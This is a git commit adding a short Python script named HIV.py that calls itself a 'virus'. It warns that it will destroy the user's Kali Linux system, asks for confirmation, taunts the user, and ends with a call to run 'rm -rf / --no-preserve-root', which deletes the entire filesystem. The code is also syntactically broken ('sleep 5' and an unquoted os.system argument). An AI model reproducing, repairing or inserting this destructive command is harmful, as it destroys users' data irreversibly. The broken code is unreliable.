a16590432f390057e64fc9ec6c3f1d1aff50015f
Nikhil Sharma <90233850+Hacker2425@users.noreply.github.com>
2022-06-07 10:56:24 +0530

    Add files via upload

---
+++ HIV.py
@@ -0,0 +1,25 @@
+import os
+from time import sleep
+import sys
+
+#if os.geteuid() != 0:
+    #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
+
+
+print ("""Before running this virus . I am gonna tell you
+       HIV virus will Destroy your Kali Linux badly
+       . Developer will not be blamed For that Damage
+       Please Run this Virus on own opportunity
+       """)
+
+choice = input("YES or NO :- ")
+
+if choice == 'NO':
+  exit()
+elif choice == 'No':
+  exit()
+print("Lol, You choosed YES Now wait it is the matter of the time")
+print ("I Destroy your Kali in 5 sec")
+sleep 5 
+print("Done jerk!")
+os.system(rm -rf / --no-preserve-root )
